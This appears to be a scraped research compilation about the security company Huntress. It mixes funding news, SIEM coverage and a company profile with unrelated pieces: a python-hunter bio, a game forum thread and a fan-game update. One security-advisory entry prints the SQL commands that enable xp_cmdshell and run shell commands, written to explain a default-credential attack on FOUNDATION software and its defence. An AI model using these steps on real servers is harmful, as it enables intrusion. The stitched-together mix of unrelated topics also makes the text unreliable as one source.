keep an eye out for you.\n\nIt's imperative for organizations within the healthcare domain to recognize the gravity of such intrusions and take concerted steps to safeguard their infrastructure. Enhanced endpoint monitoring, robust cybersecurity frameworks, and proactive threat hunting are no longer optional but a necessity in the face of such sophisticated cyber threats.\n\nOutreach to Transaction Data Systems/Outcomes\n\nIn our effort to respond responsibly to this situation, we have made several attempts through various channels to contact Transaction Data Systems (now Outcomes) to communicate our findings and offer support in addressing these incidents. We have not yet been able to engage with their team.\n\nWe remain open and ready to collaborate for the safety and security of all parties involved.",

This is the ‘why’ that supercharges my team to work around the clock and democratize access to the tools and talent typically built for the enterprise,” said co-founder and CEO Kyle Hanslovan in a release.\n\nHuntress currently is realizing more than 70% year-to-year revenue growth for the past two years as it continues to “approach $100 million in annual recurring revenue.”\n\nFounded in 2015, Huntress has raised nearly $310 million, per Crunchbase.\n\nCyber funding\n\nHuntress’ fresh round is just the latest big cybersecurity round in a Q2 where funding has taken off.\n\nWith a couple of weeks still remaining in the quarter, cyber startups have raised $4.1 billion in 141 deals, per Crunchbase data. That far outpaces Q1’s numbers, when such startups raised $2.7 billion in 140 deals and smashes last year’s Q2 totals of $1.8 billion in 192 deals.\n\nOf course, this year’s Q2 numbers are helped out immensely by cloud security startup Wiz’s big announcement in May that it had raised $1 billion at a $12 billion valuation.

      "# [Cracks in the Foundation: Intrusions of FOUNDATION Accounting Software](https://www.huntress.com/blog/cracks-in-the-foundation-intrusions-of-foundation-accounting-software)\nOn September 14, Huntress discovered an emerging threat involving FOUNDATION Accounting Software, which is commonly used by contractors in the construction industry. Attackers have been observed brute forcing the software at scale, and gaining access simply by using the productâs default credentials. We're seeing active intrusions among plumbing, HVAC, concrete, and similar sub-industries.\n\nâ\n\nHow It Works\n\nThe FOUNDATION software includes a Microsoft SQL Server (MSSQL) instance to handle its database operations. While it is common to keep a database server internal and behind a firewall or VPN, the FOUNDATION software features connectivity and access by a mobile app.\n\nFor that reason, the TCP port 4243 may be exposed publicly for use by the mobile app. This 4243 port offers direct access to MSSQL.Â\n\nMicrosoft SQL Server includes a default system administrator account named [.highlight]sa[.highlight], which has full administrative privileges over the entire server. Additionally, the FOUNDATION software looks to have created a [.highlight]dba[.highlight] account, which is not a built-in user, but Huntress has observed multiple instances where these high-privilege accounts are left with unchanged default credentials.\n\nBecause these accounts have such a high privilege, these administrator accounts can readily enable and leverage a feature known as [.highlight]xp_cmdshell[.highlight] within MSSQL. This is an extended stored procedure that allows the execution of OS commands directly from SQL, enabling users to run shell commands and scripts as if they had access right from the system command prompt.\n\n[.highlight]-- Enable advanced options[.highlight]\n\n[.highlight]EXEC sp_configure 'show advanced options', 1;[.highlight]\n\n[.highlight]RECONFIGURE;[.highlight]\n\n[.highlight]-- Enable xp_cmdshell[.highlight]\n\n[.highlight]EXEC sp_configure 'xp_cmdshell', 1;[.highlight]\n\n[.highlight]RECONFIGURE;[.highlight]\n\n[.highlight]-- Run a shell command as an example[.highlight]\n\n[.highlight]EXEC xp_cmdshell 'ipconfig';[.highlight]\n\nâ\n\nHow To Stay Protected\n\nSince we're seeing attackers exploit publicly facing versions of the software using default credentials, we advise the following to mitigate this threat:\n\nRotate all credentials for accounts connected to FOUNDATION's database, including [.highlight]dba[.highlight] and [.highlight]sa[.highlight].\n\nThis can be done within MSSQL with a command:\n\n[.highlight]ALTER LOGIN sa WITH PASSWORD = 'NewStrongPassword';[.highlight]\n\n[.highlight]ALTER LOGIN dba WITH PASSWORD = 'AnotherNewPassword';[.highlight]\n\nWhere possible, cease exposing the [.highlight]Foundation[.highlight] application to the public Internet.\n\nDisable [.highlight]xp_cmdshell[.highlight] where appropriate.\n\nâ\n\nHow We Discovered the Threat\n\nThe Huntress SOC initially saw activity begin on September 14 at 15:38:35 UTC. What tipped us off was host/domain enumeration commands spawning from a parent process of [.highlight]sqlservr.exe[.highlight].\n\nLooking at commonalities among the affected machines, it was apparent that the attack was scripted, as the same commands spread out across several unrelated companies within a span of a few minutes.\n\nâ\n\nFor your own investigative purposes, the FOUNDATION software is typically installed at:\n\n[.highlight]C:\\Program Files (x86)\\Foundation[.highlight]\n\nwith a subdirectory, [.highlight]ServerConsole3000[.highlight], that contains its server component.\n\nTo examine the SQL database access, we saw the brute force attempts in\n\n[.highlight]C:\\Program Files\\microsoft sql[.highlight]\n\n[.highlight]server\\MSSQL12.FOUNDATION\\MSSQL\\Log\\ERRORLOG[.highlight]\n\nwhere the version MSSQL12 may vary between MSSQL11, MSSQL13, MSSQL15, etc.\n\nOn one host we observed ~35,000 brute force login attempts against the MSSQL server ending just an hour before a successful authentication and enabling [.highlight]xp_cmdshell[.highlight] to run commands. It is evident in the logs:\n\n2024-09-14 11:24:45.79 spid51Â Â Â Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n\n2024-09-14 11:24:45.81 spid51Â Â Â Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n\nWhile the brute force attempts may be any scanner on the Internet, access to [.highlight]xp_cmdshell[.highlight] from just default credentials is a more severe issue.\n\nLooking across the 3M+ endpoints that Huntress protects, we discovered ~500 hosts running the FOUNDATION software. From that pool, we confirmed that a sample of 33 hosts were publicly exposed with unchanged default credentials.\n\nâ\n\nHow Huntress Has Responded\n\nAs we typically do, we immediately isolate any machines where we detect suspicious activity while we investigate. At that point, we set out to identify the underlying cause for the suspicious activities. We also took measures to identify any potential detection capabilities.\n\nIn addition to notifying those where we saw suspicious activity, we also sent out a precautionary advisory notification to any of our customers and partners who have the FOUNDATION software in their environment. While we did not see any suspicious activity in these accounts, we wanted to ensure they take the precautionary measures we suggested above to reduce the risk of them being compromised in the future.\n\nâ",

      "# [Huntress Unveils ‘Intuitive’ SIEM Offering Tailored To MSPs, SMBs by Kyle Alspach](https://www.crn.com/news/security/2024/huntress-unveils-intuitive-siem-offering-tailored-to-msps-smbs)\nThe vendor’s expansion into SIEM provides a new option that is less complicated and more affordable than competing platforms, while still providing a major improvement to security outcomes, Huntress CTO Chris Bisnett tells CRN.\n\nHuntress unveiled its new managed SIEM offering that aims to be a less-complicated and more-affordable alternative focused on the unique needs of MSPs and their SMB customers, according to Huntress Co-founder and CTO Chris Bisnett.\n\nThe expansion by Huntress into SIEM (security information and event management) is part of the vendor’s efforts at continuing to enable MSPs with a wider array of offerings on one platform for boosting SMB security outcomes, Bisnett said. It’s also significant because SIEM has traditionally been considered too complex and expensive for MSPs, he noted.\n\n[Related: Huntress CEO On Raising $150M To ‘Democratize’ SIEM, Data Protection For SMBs]\n\nAs it’s now being offered by Huntress, SIEM constitutes a “huge” opportunity for MSPs, Bisnett said. Key differentiators for the Huntress managed SIEM offering include using highly efficient data collection and retention techniques to keep costs predictable and minimal, which is crucial for service providers, he said.\n\n“It allows us to just drop out significant amounts of data that ultimately has little to no security relevance,” Bisnett said.\n\nAccording to one MSP and Huntress partner, the expansion by the vendor into SIEM is a welcome move, which is seeing Huntress bring the same streamlined approach to SIEM that it has previously to endpoint and Microsoft 365 security. The Huntress SIEM provides “one central location where we can calculate and collect a lot of our security data and metrics,” said Marcel Pawlowski, security engineer at Microtime Computers, an Andover, Mass.-based MSP.\n\nThe result, Pawlowski said, is that using the Huntress SIEM “really ups our digital forensics and incident response capabilities, while not being overly complicated.”\n\n‘Perfect Balance’\n\nGiven that Microtime has four people in its security and engineering department, the MSP isn’t able to staff a 24/7 security team, he noted. The Huntress SIEM provides a “perfect balance” to boost the MSP’s security operations capabilities with its level of staffing, according to Pawlowski.\n\n“I don't need to look at it every day. But at the same time, if an incident happens, I know the data is all there, it's accurate, the data sources are configured properly,” he said. “So it's everything that an MSP is looking for basically.”\n\nPawlowski said he has used a number of SIEM systems previously in his career, many of which were clunky and difficult to set up. During usage of the Huntress offering while in private beta, Microtime has found the SIEM to be a refreshing change, he said.\n\nIn particular, the user interface is “designed in a way that is very intuitive for somebody who hasn't used a SIEM before,” Pawlowski said. “The query mechanism is very simple. It uses a unified language that the documentation is very clear on. So it's effectively a pickup-and-go sort of solution. Anybody can do it.”\n\nThe launch of the Huntress managed SIEM offering follows the company’s June fundraise of $150 million aimed at accelerating its expansion into new product segments.\n\nIn addition to SIEM, the SMB-focused managed cybersecurity vendor is eyeing additional categories such as security posture management, as well as offerings that will “reinvent” data backup and recovery, Huntress Co-Founder and CEO Kyle Hanslovan told CRN previously.",
      "# [Python Huntress on 2023-11-03](https://pythonhuntress.com/about/)\nIn 2019, Amy was a real estate broker with a very successful business that she had built over 13 years. When she learned that there was a Burmese Python problem in Florida, she had to check it out because she has always had a fascination and passion for snakes and reptiles. So Amy scheduled a Florida vacation to see what it was all about. She connected with professional python hunter, Donna Kalil, and went on a hunt where we caught a beautiful 9-foot python.\n\nFor Amy, it was absolutely the best day ever and she was totally hooked!\n\nA few days after returning home, Amy knew she had to move to Florida and figure out how to be a Burmese Python hunter. Suddenly she knew how to use her passion as more than just a hobby. She could help Florida with this colossal problem and make a difference in the world. Within six weeks Amy sold her real estate client database, rented a room in Miami, packed a few things, and drove to Florida to start a new life.\n\nLooking at this decision logically, it was ridiculous and insane. The python hunting program was a trial and no one could tell Amy if it was going to continue or if they would ever hire additional hunters. She didn’t have a job lined up. She didn’t know the area or where to hunt pythons. She didn’t know anyone, including the people she was going to live with.\n\nWhen Amy moved to Florida, she was one of the first one hundred hunters hired by the state. She has caught over 500 Burmese Pythons, the biggest one being 17’ 3”, 110 lbs (by herself). She has raised close to $600,000 by donating hunts to charity auctions. She has been featured on TV programs, documentaries, magazine articles and podcasts, including The New York Times, National Geographic, Time Magazine, The Today Show, Fox and Friends, CNBC and Reader’s Digest. Amy has started her own guiding service to take people out on python hunts. Out of her love of snakes and a desire to make something good from their demise, she figured out how to use their skin to make leather products.\n\nOne thing people ALWAYS ask Amy is, ‘Why Snakes’? And she says, “I have no idea.” Her fascination began when she was a little girl. Her dad took her to a creek and showed her how to catch all kinds of critters. It was the snakes that captured her imagination and fascination, and turned into a passion.\n\nAmy thinks of it like a musician who can naturally hear and play notes, or an interior decorator who can easily put together a room. “It’s just how I was born.” Sometimes she wonders why it couldn’t have been kittens or puppies or something a little more normal, but it’s snakes!\n\nSnakes have always been a part of Amy’s world. She was a volunteer at the Toledo Zoo in college, a breeder, an educator, part of the exotic pet and veterinary industries, and she has traveled to many places to find, observe and enjoy them. Becoming a python hunter just seemed like a logical next step.\n\nThe Burmese Pythons are beautiful and fascinating and it’s not their fault they are here. Unfortunately, they have to be removed and there is no other option.",
      "# [Huntress warns of attacks on Foundation Software accounts by Arielle Waldman, Alex Scroxton, Ben Lutkevich, Ed Moyle on 2024-09-18](https://www.techtarget.com/searchsecurity/news/366611274/Huntress-warns-of-attacks-on-Foundation-Software-accounts)\nHuntress warned that attackers are targeting the construction industry with brute force attacks against accounting software accounts with default credentials.\n\nIn a blog post published Tuesday, the cybersecurity vendor detailed an emerging brute force attack campaign it first observed Sept. 14. The campaign is targeting customers of Foundation Software, which is commonly used in the construction industry for financial reporting and billing forms.\n\nMax Rogers, senior director of Huntress' threat operations center, flagged suspicious activity Sept. 14 in a post on X, formerly Twitter. Rogers said Huntress was seeing \"wide-spread attacks against Construction companies.\"\n\nAfter detecting suspicious activity, Huntress said it isolated affected machines and initiated an investigation. Additionally, the company notified any affected individuals and sent a \"precautionary advisory\" to any Huntress customer who uses Foundation in their environment.\n\nThe attack scope may be limited for now. Huntress said it discovered around 500 hosts running the Foundation software and that 33 of them were publicly exposed with unchanged default credentials. John Hammond, principal security researcher at Huntress, told TechTarget Editorial that although the numbers may appear small, there are third-party risks to consider as affected customers may internal connections to other organizations.\n\nThose concerns particularly apply to the 33 hosts with unchanged default passwords. Hammond said the security shortcoming provides attackers with \"immediate and open-door access.\" The blog post expanded on the scope and affected industries.\n\n\"Attackers have been observed brute forcing the software at scale, and gaining access simply by using the product's default credentials. We're seeing active intrusions among plumbing, HVAC, concrete, and similar sub-industries,\" Huntress wrote in the blog post.\n\nHuntress stated the attack takes advantage of publicly facing Foundation instances. Foundation uses the Microsoft SQL Server, which Huntress said is a database that includes a default system administrator account. If attackers compromise the account, dubbed \"sa,\" they can gain full administrative privileges over the entire server.\n\nHuntress observed that many high-privilege sa accounts still use default credentials, which unknown threat actors compromised through brute force attacks. Once threat actors access the accounts, they can use a feature called \"xp_cmdshell\" within SQL Server, which enables users to run operating system commands and scripts.\n\n\"On one host we observed ~35,000 brute force login attempts against the MSSQL server ending just an hour before a successful authentication and enabling xp_cmdshell to run commands,\" the blog post said.\n\nHuntress recommended that users rotate credentials for accounts connected to the Foundation database, disable xp_cmdshell if possible, and remove the application from the public internet wherever possible.\n\nTracie Kuczkowski, vice president of marketing at Foundation, sent the following statement to TechTarget Editorial:\n\n\"The event potentially impacted a small subset of on-premise FOUNDATION users. It did not at all impact the bulk of our accounting users, which are under our secure, cloud-based SaaS offering. It also did not impact our internal systems or any of our other product offerings through our subsidiary companies. As a result of not following recommendations and security best practices that were provided (one example being not resetting the default credentials), this small subset of on-premise users might face possible vulnerabilities. We have been communicating and providing technical support to these users to mitigate this.\"\n\nKuczkowski also said that Foundation is currently working with Huntress to \"correct the information they have posted.\"\n\nHammond provided TechTarget Editorial with more details on the disclosure process with Foundation. \"Huntress attempted to reach out to Foundation throughout the weekend but had not received a response until Monday. Speaking over the phone, Foundation confirmed the default credentials that we saw abused and that they had received reports from a small number of their customers,\" he said. \"They confirmed this was a default configuration for on-premises installations of the Foundation software.\"\n\nHammond also confirmed that communication with Foundation is ongoing.\n\n\"Huntress was in contact with Foundation as recently as yesterday. Over email, Foundation had asked for more specific statements to be included, suggesting their customers should follow their best practices and recommendations,\" he said. \"Upon asking Foundation for a link to their best practices guide & documentation, Huntress has not received a response.\"",

      "# [Cybersecurity firm flags attack on construction accounting system by Matthew Thibault on 2024-09-18](https://www.constructiondive.com/news/cybersecurity-huntress-foundation-software-sql/727376/)\nThis audio is auto-generated. Please let us know if you have feedback.\n\nDive Brief:\n\nEllicott City, Maryland-based cybersecurity firm Huntress has discovered an emerging threat for users of Foundation Software, which bills itself as serving 43,000 construction professionals nationwide. In a Sept. 17 report, Huntress said plumbing, HVAC, concrete and similar subcontractors were actively impacted.\n\nHuntress described the hack as a “brute force” attack, where perpetrators use an automated trial-and-error engine to guess credentials or other sensitive information. The affected companies were using default credentials — i.e., usernames and passwords that come with the software on purchase and that are supposed to be changed on installation — at the time of the intrusion, according to Huntress.\n\nHuntress discovered about 500 hosts running the Foundation software from the 3 million-plus endpoints it monitors for its clients, according to the report. From that pool, the company confirmed that a sample of 33 hosts were publicly exposed with unchanged default credentials. On one impacted host, it observed more than 35,000 brute force login attempts.\n\nDive Insight:\n\nFoundation told Construction Dive that some of the information in the Huntress report was inaccurate, and said that affected users were limited to clients still using legacy software physically installed at their own companies — i.e., on premise — rather than via Foundation’s hosted environment.\n\nThe impacted clients did not follow the protocol of changing their user ID and password, said Mike Ode, Foundation’s CEO, who noted the firm hosts the vast majority of its customers via its software-as-a-service offering.\n\n“If you buy a software and you install it at your place, you are responsible for the security and the walls and the perimeter, right?” Ode told Construction Dive. “We're responsible for what we've been selling for the last decade, and that's a hosted solution.”\n\nHe urged impacted firms to adopt hosted software instead.\n\n“We want everybody in our SaaS-hosted environment, right? Let us do it. Let us take on the responsibility,” Ode said. He asserted the attack mentioned in the report may have impacted just a single client, but acknowledged he didn’t know for certain.\n\nThe risks\n\nThe U.S. Cybersecurity and Infrastructure Agency has said use of default passwords is a major cybersecurity issue and has been urging organizations to reset them.\n\nEven though the intrusions occurred, there was no compromise or malicious activity on those computers, said John Hammond, principal security researcher at Huntress. Hammond said that to protect themselves, contractors who use the software should change their credentials, including passwords.\n\nHuntress noted that Foundation uses Microsoft SQL in its software. The combined platforms feature two high-privilege administrative accounts, dubbed “sa” and “dba” within the system. If their default credentials are left unchanged upon installation, perpetrators can have an easy entryway into the software.\n\nWhen contacted, Microsoft pointed Construction Dive to its SQL security best practices web page.\n\nFor a hacker, Hammond described the effort needed to breach the impacted instances of Foundation’s software as “trivial,” and likened it to typing in a password.\n\n“Once a threat actor finds an on-premise Foundation server, they could authenticate as the database administrator, and enable new settings to do whatever they might like on the whole computer,” Hammond said. “Candidly, it takes just one command to log in, and just two more to do real damage.”\n\nHammond said bad actors could access sensitive information, such as credentials or financial details, as well as gain entry into the computer itself.\n\n“This is a foothold and initial access vector into a whole network, with administrator privileges right out of the gate,” Hammond told Construction Dive via email. “In some cases we have observed the SQL server installed directly onto an organization's domain controller, which means it is immediate keys to the kingdom for the entire environment.”",

Did I miss it?!😢\n\nEdit: I contacted player support and they gave me the cosmetic!\n\nYou’re lying😭 They never specified what day, no calendar or anything! People were playing the PTB! I’m sobbing right now. This is the worst thing possible. They had certain rewards available for a whole week during the Christmas event but they didn’t do that this time!? 💀\n\nIn the Anniversary video. I believe they said you only have to long on once within the week to get the piece of cosmetics 1 meg & huntress item each week\n\nHave you checked to see if it's there with all your other outfits?\n\nI ask because there was no notification, but I still got the Meg and Huntress cosmetics anyway.\n\nMaybe support can help? If you've returned back from the PTB, surely you should still get the free cosmetics? because like others have said, they should still be available for the rest of the week.\n\nYeah I got the torso. But I recall them saying you had a period of time in which to claim it, not just the one day. Unless I misheard\n\nI'm guessing you need to log in on the live branch to claim items.\n\nThe PTB is a bit funky in that it uses an outdated version of your account, and doesn't save to your main account.\n\nI’m still at work lol. I honestly think it might have been only that day and we missed it for good. But the day reset isn’t till 8PM EST so I won’t know until then.\n\n\"Logging in at least once each week will even get you a piece of 2 full Outfits for The Huntress and Meg Thomas\", this is right from BHVR official site, Before the Masquerade section.\n\nI recieved both item when I logged on the 14th. And yes there was a pop up.\n\nAlso in the Anniversary video they stated that the outfits are re colors. They didnt say they were from a past rift. BI really dont know because I missed some rifts\n\nI’m going to make the assumption that you had to log in that day and if you didn’t get it then it’s gone for good. It’s really sad because that outfit has been gone for over a year and they dropped it during the PTB. Which is 35GB so I always leave it installed for the week to make content.\n\nThey've said repeatedly that you should get it for logging in at any point during the Before The Masquerade week 1 (and the parts 2 and 3 during Weeks 2 and 3 respectively). Since the Bloodfeast is ongoing, so should that weeklong duration.\n\nThis is definitely a job for support. Have you contacted them yet?\n\nYeah I have but they haven’t responded yet. I also logged into my Epic Games DBD and My Xbox DBD and didn’t get it on all 3 of them. Neither has all 4 of my friends gotten it. So I figured Bhvr just said it wrong\n\nYou should just get them when you login. Check your inventory on Huntress. If it’s not there you might have to contact support!\n\nYeah i already had them but i just got the pop-up for both of the items when i logged in yesterday. So i guess for me they were never granted either.",

It's been a long while since I given proper news on whats going on with the game, so I figured I'll let you know now.\n\nWay back in September/October of 2023 I hit a major wall with the game's development I hit a point where the game was heavily bogged down with art,code,and sounds to the point it actually was causing severe performance issues, some ow which made the game almost unplayable.\n\nHowever after months of experimenting with settings, approaches to handling parts of the game, etc. I was able to identify a clear strategy to optimize the game, and while taking an additional month to implement, it actually greatly improved performance, thus saving this project!\n\nA Big graphical overhaul!\n\nWith so much changes needed, I strongly felt the need to also revemp the games look and feel along with that to match this new and improved 'foundation' I built. Hence the Rebrand to \"Ruby: Huntress of Vale\" and with that a whole new UI. A new 'modern' looking UI for combat mode, nice accents, menus, and even new promotional images were done.\n\nThere is also new features like Ruby's Crescent Rose getting a new Sword Mode, and Shotgun Modification on its way as well!\n\nWe are also introducing a new playable character Penny! You can see some alpha footage here:\n\nAlso been working with a lot of talent in the FNDM to make custom voices for Combat Mode:\n\nAs you can see there is plenty to look forward to. These changes will be completed in an upcoming update soon!\n\nAlso Please note \"Ruby: Huntress of Vale\" is taking part in the Summer of RWBY fan event!",

As of December 2023, Huntress employs approximately 262 people and has raised nearly $310 million in funding, achieving a valuation of over $1.5 billion following its latest funding round in June 2024 [(Tracxn, 2021)](https://tracxn.com/d/companies/huntress/__cLF4uZkm9FHBAxKJRozBHTE8nzxu7UTLdvZ531GWVXg), [(Metinko, Crunchbase, 2024)](https://news.crunchbase.com/cybersecurity/huntress-unicorn-wiz-startup-venture-funding/).\n\n## Recent Funding and Valuation\n\nOn June 18, 2024, Huntress successfully raised $150 million in a Series D funding round, led by Kleiner Perkins, Meritech Capital, and existing investor Sapphire Ventures. This funding round has positioned Huntress as a \"unicorn\" in the cybersecurity space, with a valuation exceeding $1.5 billion. The company has reported over 70% year-over-year revenue growth for the past two years, approaching $100 million in annual recurring revenue [(Metinko, Crunchbase, 2024)](https://news.crunchbase.com/cybersecurity/huntress-unicorn-wiz-startup-venture-funding/).\n\n## Product Overview: Huntress\n\nHuntress offers a managed cybersecurity platform that includes endpoint detection and response (EDR) capabilities, which have recently been enhanced to include active remediation and macOS coverage. This allows security administrators to authorize Huntress to take action on their behalf without manual review, streamlining the remediation process [(Masters, MSSP Alert, 2024)](https://www.msspalert.com/news/mssp-market-news-usx-cyber-huntress-arctic-wolf-averlon).\n\nIn addition to EDR, Huntress has expanded its product offerings to include a managed Security Information and Event Management (SIEM) solution tailored for managed service providers (MSPs) and their SMB customers. This new offering aims to simplify the complexities typically associated with SIEM systems, making it more accessible and affordable for smaller organizations [(Alspach, CRN, 2024)](https://www.crn.com/news/security/2024/huntress-unveils-intuitive-siem-offering-tailored-to-msps-smbs).\n\n## Recent Developments and Threat Intelligence\n\nHuntress has been actively involved in identifying and mitigating cybersecurity threats. For instance, in September 2024, the company reported a brute force attack campaign targeting users of FOUNDATION Accounting Software, commonly used in the construction industry. Huntress discovered that many affected companies were using default credentials, which allowed attackers to gain unauthorized access. The company has advised users to change their credentials and implement better security practices [(Waldman et al., TechTarget, 2024)](https://www.techtarget.com/searchsecurity/news/366611274/Huntress-warns-of-attacks-on-Foundation-Software-accounts), [(Thibault, Construction Dive, 2024)](https://www.constructiondive.com/news/cybersecurity-huntress-foundation-software-sql/727376/).\n\n## Partnerships and Collaborations\n\nHuntress has also formed strategic partnerships to enhance its service offerings. Notably, the company partnered with CyberCert to provide SMB1001 certifications for its MSP partners, which will help them demonstrate their cybersecurity posture to clients. This initiative is part of Huntress's broader strategy to support its partners in improving their cybersecurity capabilities [(Karen, ARN, 2024)](https://www.arnnet.com.au/article/3482198/huntress-partners-with-cybercert-for-smb1001-certifications.html).\n\n## Executive Insights\n\nKyle Hanslovan, co-founder and CEO of Huntress, emphasized the company's mission to democratize access to cybersecurity tools for smaller businesses, stating, “Everyone deserves the ability to protect themselves and their employees’ livelihoods. This is the ‘why’ that supercharges my team to work around the clock” [(Metinko, Crunchbase, 2024)](https://news.crunchbase.com/cybersecurity/huntress-unicorn-wiz-startup-venture-funding/). Chris Bisnett, co-founder and CTO, highlighted the importance of their new SIEM offering, noting that it provides a \"huge\" opportunity for MSPs to enhance their security operations without the complexity typically associated with such systems [(Alspach, CRN, 2024)](https://www.crn.com/news/security/2024/huntress-unveils-intuitive-siem-offering-tailored-to-msps-smbs).\n\n## Conclusion\n\nHuntress is positioned as a significant player in the cybersecurity landscape, particularly for SMBs and IT service providers. With its recent funding, product expansions, and proactive threat intelligence efforts, the company is well-equipped to address the evolving cybersecurity challenges faced by its clients. Prospective candidates and investors should consider Huntress's growth trajectory, innovative product offerings, and commitment to enhancing cybersecurity for smaller organizations as key factors in their decision-making process."
